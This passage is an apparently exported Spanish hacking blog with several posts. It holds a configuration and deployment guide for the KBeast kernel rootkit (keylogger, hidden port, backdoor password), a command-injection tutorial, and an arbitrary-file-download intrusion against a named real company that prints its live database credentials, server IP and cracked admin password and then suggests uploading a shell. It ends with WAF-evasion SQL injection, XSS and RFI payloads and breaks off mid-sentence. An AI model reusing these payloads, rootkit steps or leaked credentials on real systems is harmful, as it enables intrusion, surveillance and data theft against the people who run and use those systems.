src="http://i.imgur.com/GZ4hh.png" /></a></div><br />Una vez extraido nos encontramos con varios files, tendremos que editar a nuestro antojo el archivo de configuracion config.h <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ /* Kernel Beast Ver #1.0 - Configuration File Copyright Ph03n1X of IPSECS (c) 2011 Get more research of ours http://ipsecs.com */   /*Don't change this line*/ #define TRUE 1 #define FALSE 0   /* Enable keylog probably makes the system unstable But worth to be tried */ #define _KEYLOG_ TRUE   /*Define your module & network daemon name*/ #define KBEAST "kbeast"   /* All files, dirs, process will be hidden Protected from deletion & being killed */ #define _H4X0R_ "_h4x_"   /* Directory where your rootkit will be saved You have to use _H4X0R_ in your directory name No slash (/) at the end */ #define _H4X_PATH_ "/usr/_h4x_"   /* File to save key logged data */ #define _LOGFILE_ "acctlog"   /* This port will be hidded from netstat */ #define _HIDE_PORT_ 13377   /* Password for remote access */ #define _RPASSWORD_ "h4x3d" #define _MAGIC_NAME_ "bin" /* Magic signal & pid for local escalation */ #define _MAGIC_SIG_ 37 //kill signal #define _MAGIC_PID_ 31337 //kill this pid ]]></script> <br />Prosigo a explicar la funcion de cada linea en el fichero de configuracion.<br /><br />1- La primera linea la dejamos tal cual esta<br />2- La segunda se encarga de activar el modulo keylogger del rootkit en caso contrario escribimos  <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _KEYLOG_ FALSE ]]></script> 3- Se encarga de darle el nombre al daemon rootkit <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define KBEAST "q3rv0" ]]></script> 4 – En esta linea vamos a incluir los ficheros y directorios que queremos que sean protegidos por el anti-remove. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _H4X0R_ "/home/q3rv0/protect/q3rv0.txt" ]]></script> 5- Define el directorio donde se guardara KBeast <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _H4X_PATH_ "/usr/share/kbeast" ]]></script> 6 – Aca especificamos el nombre del fichero de log donde van a ir a parar las pulsasiones capturadas por el keylogger <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _LOGFILE_ "acctlog" ]]></script> 7- El puerto que estara hide a la vista de los comandos anteriormente mencionados. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _HIDE_PORT_ 6666 ]]></script> 8- Incluimos el password para el acceso con el backdoor. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _RPASSWORD_ "q3rv0" #define _MAGIC_NAME_ "bin" ]]></script> Habiendo terminado de configurar el ficherito, que bastante intuitivo es, si me saltee la 9, pero esa la dejo tal cual esta.  Procedemos a lanzar el rootkit de la siguiente manera.  En los kernel 2.6.18 <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup buil 0 ]]></script> En los 2.6.32 como es mi caso<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup build ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/hw6x4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/hw6x4.png" /></a></div><br />Vemos que se compilo exitosamente en el nucleo sin ningun error, ahora vamos a comprobar si cumple con nuestras espectativas.<br /><br /><ul><li>Verificando la proteccion anti-remove de ficheros&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/500HR.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/500HR.png" /></a></div><br /><ul><li>Directorio donde se guarda el rootkit en el systema&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/VSJz7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/VSJz7.png" /></a></div><br /><ul><li>Pulsaciones capturadas por el modulo keylogger… El fichero de log se guarda en el directorio donde le indicamos que se guarde el rootkit.&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GPSES.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/GPSES.png" /></a></div><br /><ul><li>Port 6666 Hide&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/xjczD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/xjczD.png" /></a></div><br /><ul><li>Accediendo al sistema a travez del backdoor en el puerto 6666&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/ygqhy.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/ygqhy.png" /></a></div><br /><ul><li>oka, para remover el rootkit del kernel solo basta realizar un:&nbsp;</li></ul>&nbsp;<script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup clean ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/FwpY9.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/FwpY9.png" /></a></div><br />Espero que lo hayan disfrutado y cada vez que rooteen un server acuerdense de kbeast :)  Saludos!</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/remote-code-execution/">Remote Code Execution</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T10:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:33 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-Ned7_Int1wo/U_mluKwBHvI/AAAAAAAADrM/cJrFJK87rl8/s1600/Samba%2Bremote%2Bcode%2Bexecution%2Bvulnerability,%2BPatch%2BReleased.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-Ned7_Int1wo/U_mluKwBHvI/AAAAAAAADrM/cJrFJK87rl8/s1600/Samba%2Bremote%2Bcode%2Bexecution%2Bvulnerability,%2BPatch%2BReleased.jpg" height="480" width="640" /></a></div><br />La ejecucion remota de comandos, como su nombre lo dice, es una vulnerabilidad que nos permite inyectar ordenes remotamente en el sistema, basicamente se debe a un mal filtrado de variables que utilizan funciones como:<br /><ul><li>system()</li><li>passthru()</li><li>shell_exec()</li><li>exec()</li><li>ssh2_exec()</li><li>popen()</li></ul>Y demas funciones php que permiten la ejecucion de comandos en el OS.<br /><br />Hay ciertas webs, que utilizan scripts que se encargan de interactuar con los datos que el usuario provee en la aplicacion, muchos de ustedes seguramente habran echo uso de servicios de fingerprinting online, los cuales nos permiten utilizar comandos como whois, ping, dig, nslookup, etc<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/BFcGN.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/BFcGN.png" height="288" width="640" /></a></div><br />Justamente de este tipo de webs hablo, si no se aplica una correcta  seguridad en la aplicacion podria ser brutal para la misma, ya que  cualquier usuario con conocimientos se podria aprovechar del mal filtro y  lanzar comandos arbitrariamente en el sistema oporativo.<br /><br />En si la explotacion de este tipo de vulnerabilidad no conlleva una complicacion en cuanto al uso de vectores largos, salvo que en el servidor victima este corriendo mod_security o algun otro tipo de waf con sus respectivos filtros. La idea no es explicar a evadir los mismos, si no mostrar que tan sencillo es explotar esta tecnica.<br /><br />Vamos a ver un posible codigo vulnerable.<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php if (isset($_POST['boton-ping'])) {     $objetivo=$_POST['target'];     echo "<pre class=”report-header”>";<br />    echo shell_exec(" nslookup " .$objetivo);<br />    echo "</pre>"; } ?>]]></script> Vemos como toma los valores del usuario a travez de POST, y luego ejecuta la entrada con nslookup, a todo esto, no hay una sola verificacion de variables, desp voy a explicar como se puede corregir el script.  Como se puede aprovechar de la ineficiencia de un programador?  Sencillamente, usando una | (tuberia pipe) o ; (actua como separador de comandos)  Supongamos que quisieramos averiguar la version del kernel.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ 10.x.x.x|uname -a ]]></script> o<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ 10.x.x.x ; uname -a ]]></script> El codigo se ejecutaria de la siguiente manera en el script.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ nslookup 10.x.x.x|uname -a ]]></script> Lo cual terminaria imprimiendo la version del kernel.<br />Sencillo no??.<br />Como se puede corregir esta vulnerabilidad?<br /><ul><li>Validando la entrada de datos con funciones como escapeshellarg(), escapeshellcmd() </li></ul><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php if (isset($_POST['boton-ping'])) {     $objetivo=escapeshellcmd($_POST['target']);     echo "<pre class=”report-header”>";<br />    echo shell_exec(" nslookup " .$objetivo);<br />    echo "</pre>"; } ?>]]></script> De esta manera el script quedaria sano y salvo a la entrada de comandos por parte de un atacante.</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/12/arbitrary-file-download/">Arbitrary File Download</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T22:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://www.niper.ac.in/pi_dev_tools/DoPoSe-CYP/images/DPS_download.jpg" height="400" width="397" /></div><div style="text-align: right;"><br /></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Para seguir este post necesitamos comprender el concepto de LFI (Local File Inclusion)<br /><br />LFI es un error de programación en php bastante comun donde se permite incluir archivos locales del servidor dentro del codigo php de la web afectada<br /><br />Por ej:<br /><br />Include.php<br /><br /><pre class="brush: php">&lt;?php<br />$pagina = $_GET['pagina'];<br />include($pagina);<br />?&gt;<br /><br /></pre>En el source se precia un LFI en el parametro $pagina donde se puede solicitar la inclusión de contenido de otro archivo a través de include().<br /><br />El parametro pagina esta siendo solicitado por medio de una peticion GET por lo que este error se puede explotar de la siguiente manera:<br /><br /><pre class="brush: bash">http://WebVulnerable.com/Include.php?pagina="Archivo a Incluir"<br /></pre><br />Un ejemplo Practico de esto seria:<br /><br /><pre class="brush: bash">http://WebVulnerable.com/Include.php?pagina=../../../../../../../../../etc/passwd</pre><br />esto incluiría el contenido del archivo passwd y lo haria visible dentro de la pagina Include.php<br /><br />El Full Source Disclosure funciona de forma similar ya que incluiremos un archivo dentro de una pagina php de descarga,<br />y de esta forma analizaremos detalladamente el source en nuestra pc buscando información sensible<br /><br />Un Dork Comun para buscar una web vulnerable es:<br /><br /><pre class="brush: bash">inurl:download.php?file=* site:.com.ar</pre><br />Buscamos un objetivo y probamos si es vulnerable, en mi caso elegi:<br /><br /><pre class="brush: bash">www.latinrisk.com.ar/download.php?file=doc/brochure-esp-final.pdf</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i49.tinypic.com/34ozmut.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />copiamos la url y sustituimos el archivo brochure-esp-final.pdf por download.php<br /><br />www.latinrisk.com.ar/download.php?file=<span style="color: red;">download.php</span><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/29ckzh4.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />y vemos como download.php es descargado a nuestro disco duro, analisemos su contenido<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/jgm92g.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como Podremos distinguir esta la clasica falla LFI en su Source<br /><br /><pre class="brush: php">$file = basename($_GET['file']);<br /></pre><br />Esto es lo q nos va a permitir llevar a cabo nuestro ataque. Proseguimos<br />dado que podemos descargar contenido al q no tenemos acceso desde, nuestro querido download.php?file=<br />empezaremos a descargar paginas con contenido importante, Ej.<br /><br />Descargaremos el archivo index.php y analizaremos su contenido<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/33ehjf5.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i46.tinypic.com/35j0ccn.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como podremos Apreciar dentro del source de index.php encontraremos el archivo de configuración inc_loader.php<br /><br /><pre class="brush: php">&lt;? include ('inc_loader.php'); ?&gt;</pre><br />Descargemos y analicemos el Source! <br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i46.tinypic.com/qzgr6e.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i47.tinypic.com/iof7r7.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como podremos ver en el source encontraremos incluidas varios Archivos de Configuración.<br /><br /><pre class="brush: php">include('inc/connect.php');<br />include('inc/func_std.php');<br />include('inc/sanitize.php');<br />include('inc_variables.php');<br /></pre><br />El q nos interesa es inc/connect.php<br /><br />Nuevamente descargamos y analizamos<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-8mpl-kDuNZ0/VLS6VE2lT6I/AAAAAAAAAGQ/_6_HFBGMu3Y/s1600/aaaa.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-l66zYGC-zt8/VLS5_6j5MWI/AAAAAAAAAGI/i0hx014i9gk/s1600/eeee.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Como veremos en su código empezamos a distinguir sentencias q hacen referencia a la configuración de MySql<br />además distinguimos en el principio del source q se incluye el archivo config.php, Debe ser Interesante su contenido.<br /><br /><pre class="brush: php">include_once('config.php');</pre><br />Descargemos y analicemos!!! (se tiene q respetar el directorio dentro del q nos encontramos por lo tanto la ruta a incluir es inc/config.php)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-dgHS2JMO0q8/VLS6iNhQ1gI/AAAAAAAAAGY/3f4CXl79_I8/s1600/tttt.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-7H5g5saXBwA/VLS6pnRWkkI/AAAAAAAAAGg/F8TaVOkNxv8/s1600/ssss.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Y como por arte de magia podemos divisar los usuarios y contraseñas de MySql tanto Locales como remotos<br /><br /><pre class="brush: php">if ($_SERVER['HTTP_HOST'] == 'localhost' || $_SERVER['HTTP_HOST'] == 'server.lan')<br /><br />{<br /><br />&nbsp;&nbsp;&nbsp; $config['mysqlhost'] = 'localhost';<br />&nbsp;&nbsp;&nbsp; $config['mysqluser'] = 'root';<br />&nbsp;&nbsp;&nbsp; $config['mysqlpass'] = '';<br />&nbsp;&nbsp;&nbsp; $config['mysqldb']&nbsp;&nbsp; = 'db_latinrisk';<br />&nbsp;&nbsp;&nbsp; $_URL = 'http://server.lan/latinrisk/web/';<br /><br />}<br /><br />else<br /><br />{<br /><br />//&nbsp; $config['mysqlhost'] = '190.228.29.68';<br />&nbsp;&nbsp;&nbsp; $config['mysqlhost'] = '192.168.0.170';<br />&nbsp;&nbsp;&nbsp; $config['mysqluser'] = 'user_latinrisk';<br />&nbsp;&nbsp;&nbsp; $config['mysqlpass'] = 'Jwe9UoL6';<br />&nbsp;&nbsp;&nbsp; $config['mysqldb']&nbsp;&nbsp; = 'db_latinrisk';<br />&nbsp;&nbsp;&nbsp; $_URL = 'http://www.latin-risk.com/';<br /><br />}</pre><br /><br />Ahora nos fijamos si la web posee phpmyadmin:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-EJp_vP83UBQ/VLS7NcPFnpI/AAAAAAAAAGo/2psUffvhHbM/s1600/test.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Tristemente la web no tiene phpmyadmin :( pero como somos algo intrepidos y sabemos analizar el codigo vemos q el servidor MySql<br />es accesible desde la siguiente ip Publica 190.228.29.68 con Usuario "user_latinrisk" y password "Jwe9UoL6"<br /><br />Acá la imaginación del hacker, existen varios metodos para acceder remotamente a una base de datos, yo por mi parto Utilizare MySqlNavigaitor<br />(Demas esta decir q el puerto defautl de Coneccion a un servidor MySql es 3306)<br /><br /><div style="text-align: center;"><img border="0" src="http://2.bp.blogspot.com/--CJPNe-0yPw/VLS7X7yCGFI/AAAAAAAAAGw/9SiWY8yIuik/s1600/222.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Llenamos los campos Correctamente y damos en Fire :)<br /><br />Podemos ver las bases de datos que se encuentran en el sitio latinrisk.com.ar (empresa que se dedica a "Solventar Vulnerabilidades Informáticas a Empresas" XD)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-ykHZzVqMUBY/VLS7tXuoMKI/AAAAAAAAAG4/2qtLVa99_rc/s1600/ff.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />nos vamos a db_latinrisk/gral_admin y nos encontraremos con los 2 usuarios mas poderosos de esta web<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-xwhvzV5OFl4/VLS73YBWtiI/AAAAAAAAAHA/XemU4hcK4P8/s1600/tetete.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Solo queda desencryptar la pass en md5 de alguno de los 2 usuarios y tendremos acceso al AdminPanel de LatinRisk<br /><br />Para los peresosos: <br /><br /><pre class="brush: bash">admin:a4be08c8f9378e32a2ffad1ab48d3e6 (lr1120)</pre><br />Buscamos el AdminPanel con la tecnica q uds mas prefieran y llegamos a la siguiente dirección<br /><br />http://www.latinrisk.com.ar/admin/<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-ONDUxXHNkEc/VLS8Dp_AvYI/AAAAAAAAAHI/JFhV4piKdTc/s1600/panel.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Ingresamos los datos correspondientes y damos click en Ingresar<br />y podremos apreciar lo siguiente:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-hWwvgswapTk/VLS8PZYojfI/AAAAAAAAAHQ/F5miYiJhGK0/s1600/admin.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Solo queda Bypassear algun Upload de imagenes y subir nuestra shell<br /><br /><div style="text-align: right;"><b>Happy Hacking!</b></div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/12/pwneando-el-waf/">PWNEANDO El WAF!</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T19:20:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="https://yt3.ggpht.com/-xMF425K4WEM/AAAAAAAAAAI/AAAAAAAAAAA/5KqbFoj_8-A/s900-c-k-no/photo.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="https://yt3.ggpht.com/-xMF425K4WEM/AAAAAAAAAAI/AAAAAAAAAAA/5KqbFoj_8-A/s900-c-k-no/photo.jpg" width="640" /></a></div><div style="text-align: right;">&nbsp;by [Q]3rv[0]</div><b>[0x1]&nbsp;&nbsp; ------------ Que es un WAF?  </b><br /><b>[0x2]&nbsp;&nbsp; ------------ Reconocimiento de un Firewall de aplicaciones web  </b><br /><b>[0x3]&nbsp;&nbsp; ------------ Tecnicas de evacion SQL                                            </b><br /><b>[0x2a] ------------ Utilizando comentarios                       </b><br /><b>[0x2b] ------------ Uso de la funcion CHAR()                        </b><br /><b>[0x2c] ------------ HPP (Polucion de parametros HTTP) </b><br /><b>[0x2d] ------------ HPF (Fragmentacion de parametros HTTP) </b><br /><br /><b>[0x1] Que es un WAF?</b><br /><br />Ultimamente, me fui encontrando con aplicaciones que por algun motivo y siendo vulnerables me saltaban con un error del tipo 501 (method no implementado), o directamente al realizara algun tipo de inyeccion, el servidor me enviava un flag FIN y terminaba paradado con un mensajito de "The concexion was reSet", sospechoso, no?, por esta razon decidi escribir a cerca de los WAF (firewalls de aplicaciones web) <br /><br />Para quien no conozco de su existencia, los WAF se encargan de mediar entre el cliente y servidor, filtrando la entrada de caracteres segun la configuracion de seguridad del mismo.  Existen varios de estos, uno de los mas conocidos es ModSecurity, pero ademas de este muchas aplicaciones corren con:   -Libhtp   -Ironbee  y demas...  <br /><br />Un WAF trabaja en la capa de aplicación, controlando la entrada de datos en protocolos como HTTP/HTTPS/SOAP/XML-RPC y según el trafico que se halle en la blacklist de su configuración enviaran un mensaje de alerta ante determinado vector de ataque tales como:  http://vulnpage/alal.php?vuln=9999<br /><br /><pre class="brush: bash">XSS &lt;script&gt;alert(/waf/)&lt;/script&gt;<br />SQLI http://vulnpage/alal.php?vuln=9999'+or+'5'&gt;='3-- <br />LFI http://vulnpage/alal.php?vuln=../../../../../lol<br />RFI http://vulnpage/alal.php?vuln=http://lol.com/shell.txt?<br />ETC...<br /><br /></pre><b>[0x2] Reconocimiento de un Firewall de aplicaciones web    </b><br /><br />Como descubrimos la presencia de un WAF en la aplicacion?<br />Generalmente las respuestas de tipo:<br /><br />- 501 (method not implemented)  - Conexion reseteada por parte del servidor<br />- Mensaje 403  - Redireccionamiento hacia la pagina de inicio<br /><br />Estos son indicios de la presencia de algun tipo de mediador que nos esta complicando la intrusión!  Una de las maneras de obtener el tipo de waf que protege un servidor, es indagando dentro de las respuestas en las cabeceras http.<br /><br />Para ello, si estamos en duda de que la aplicación corre con un firewall web, podemos usar el buscador shodan, para cersiorarnos de  que en realidad es asi.<br /><br />Dork: "host:"Underterminal.com" Mod_security enabled"  Informacion del tipo y version de WAF en la cabecera Server. <br /><pre class="brush: bash"> <br />HTTP/1.0 200 OK<br />Date: Mon, 10 Sep 2012 20:25:38 GMT <br />Server: Mod_Security 2.5.9 enabled<br />Last-Modified: Wed, 13 Jul 2011 07:12:51 GMT<br />ETag: "c902e9-2c-4a7ee24f602c0"<br />Accept-Ranges: bytes<br />Content-Length: 44<br />Vary: Accept-Encoding,User-Agent<br />Content-Type: text/html&nbsp;</pre>Otra es usando herramientas o scripts que se encarguen de realizar un fingerprinting sobre estos como por ejemplo http-waf-detect.nse, un motor encargado de la deteccion de waf's incorporado en nmap.  Podemos utilizarlo de la siguiente manera:<br /><br /><pre class="brush: bash">nmap -Pn -n -vv -T2 --script=http-waf-detect.nse "TARGET"</pre>Para profundizar sobre Nmap:  <a href="http://resources.infosecinstitute.com/nmap-cheat-sheet-part-4/">http://resources.infosecinstitute.com/nmap-cheat-sheet-part-4/</a> <b>&nbsp;</b><br /><br /><b>[0x3] Tecnicas de Evacion SQL</b><br /><pre><b>[0x3a] Utilizando comentarios</b></pre>Las tecnicas de evacion de waf, se centran en engañar al firewall para inyectar los caracteres que se encuentran en la "Blacklist", hay varios metodos de evacion, veamos algunos implementandolos en inyecciondes SQLI<br /><br />Los comentarios   /*!*/ pueden ser utilizados para vestir a ciertas sentencias que dejan una alerta en la aplicación, veamos el siguiente ejemplo.  El siguiente path es vulnerable a sqli.<br /><br />http://somepage/intranet.php?id=[SQLI]<br /><br />"MYSQL ERROR en la sintaxis"    Enumeramos columnas de la tabla.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+order+by+5</pre><br />FALSE!, hasta ahora sabemos que la tabla que interactua con el script intranet.php posee 4 columnas, vamos a ver que pasa con la tecnica UNION.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+UNION+SELECT+1,2,3,4+AND+1=1</pre><br /><br />501 METHOD NOT IMPLEMENTED! LOL!<br /><br />Una vez que se realizo el reconocimiento de algún tipo de WAF en la aplicacion, ya sabemos que hay alguna clausula que esta siendo filtrada por este.  Tratemos de evadir la blacklist, utilizando los tag:   /**/ o /*!*/<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+/*!UNION*/+/*!SELECT*/+1,2,3,4+/*!AND*/+1=1</pre>Bien, hemos logrado saltarnos la pared del WAF.  Utilizando /**/ como %20:   <br /><pre class="brush: sql">http://somepage/intranet.php?id=9999/**//*!UNION*//**//*!SELECT*//**/1,2,3,4/**//*!AND*//**/1=1<br /></pre><br />De ahora en mas podemos ir variando la estructura de la sentencia, una manera seria cortar cada clausula con /**/  Tambien podemos utilizar dobles clausulas en el mismo vector:  <br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+/*UNION*/+UNION+/*SELECT*/+SELECT+1,2,3,4+/*AND*/+1=1</pre><br />Fijense como una esta entre los tags /**/ y otra no.<br /><br /><b>[0x3b] Uso de la funcion CHAR()&nbsp;</b><br /><br />CHAR() es una funcion sql que basicamente transforma un caracter/s en ascii a string.  pP ejemplo<br /><br />q=113  mysql&gt; <br /><pre class="brush: sql">SELECT ASCII('q');</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-tvxW2SjbZvU/VLSJ6ygD6oI/AAAAAAAAAFo/gI4YV5wiBgM/s1600/ascii.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-tvxW2SjbZvU/VLSJ6ygD6oI/AAAAAAAAAFo/gI4YV5wiBgM/s1600/ascii.png" /></a></div><br />mysql&gt; <br /><pre class="brush: sql">SELECT CHAR(113);</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-_CrG22DUCG8/VLSKFFzTgwI/AAAAAAAAAFw/b3Z1uExBI_Y/s1600/char.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-_CrG22DUCG8/VLSKFFzTgwI/AAAAAAAAAFw/b3Z1uExBI_Y/s1600/char.png" /></a></div><br /><pre class="brush: sql">SELECT CHAR(91, 81, 93, 51, 114, 86, 91, 48, 93);</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-O3v-YXD99U0/VLSKOcCIbAI/AAAAAAAAAF4/w3acRD_FSLs/s1600/selectchar.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-O3v-YXD99U0/VLSKOcCIbAI/AAAAAAAAAF4/w3acRD_FSLs/s1600/selectchar.png" height="80" width="320" /></a></div><br />Entonces ya nos podemos ir dando una idea de como ofuscar nuestro vector.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+UNION+SELECT+1,2,3,4+AND+1=1</pre>Quedaria mas o menos de la siguiente manera vistiendo a UNION &amp; SELECT<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+CHAR(117, 110, 105, 111, 110)+CHAR(115, 101, 108, 101, 99, 116)+1,2,3,4+AND+1=1<br /></pre><br /><b>[0x3c] HPP (Polucion de parametros HTTP)&nbsp;</b><br /><br />La vulnerabilidad HPP puede ser aprovechada para insertar nuestros vectores en la aplicacion y asi poder decierle al WAF "OWNED BABY!"      Pero que es HPP?????  <br /><br /><div style="text-align: center;"><b>HPP (Polucion de parametros HTTP)</b><br /><b>&nbsp;</b> </div>HPP es una vulnerabilidad web que no tiene muchos años de nacida, fue descubierta en el 2009, esta tecnica se centra en inyectar varios valores en un mismo parametro, bien, ustedes se deben estar preguntando, pero de que me sirve ante la evacion de un firewall web??  <br /><br />Sabemos que los usuarios interactuan con aplicaciones dinamicas a travez de un parametro, hay variable que almacenan varios valores, pero otras que se encargan de almacenar 1 solo valor, en ese tipo de var que pasaria si le introdujeran dos valores diferentes??      <br /><br />Segun la tecnlogia que utilice la aplicacion reaccionara de determinada forma, aca les pongo un par de ejemplos de como toman 2 o mas valores distintas tecnologias web.     <br /><br />ASP.NET/IIS -------------------&gt; concacatena dos o mas valores con una coma  ejemplo: id=q3rv0,[Q]3rV[0] <br /><br />PHP/APACHE ---------------------&gt; imprime el segundo valor de 2<br />ejemplo: id=q3rv0&amp;id=[Q]3rv[0]     <br /><br />lo que se interpretara en el servidor sera el segundo valor [Q]3rv[0]      Bien vallamos a la accion, los WAF's generalmente verifican cadas variable por separado, es decir si utilizamos el siguiente vector para ofucar codigo aprovechando un HPP       <br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999+OR+1=COVERT(INT,(@@VERSION))--<br /></pre><br />Evacion:<br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999+CONVERT(INT&amp;id=(@@VERSION))--<br /></pre><br />Con 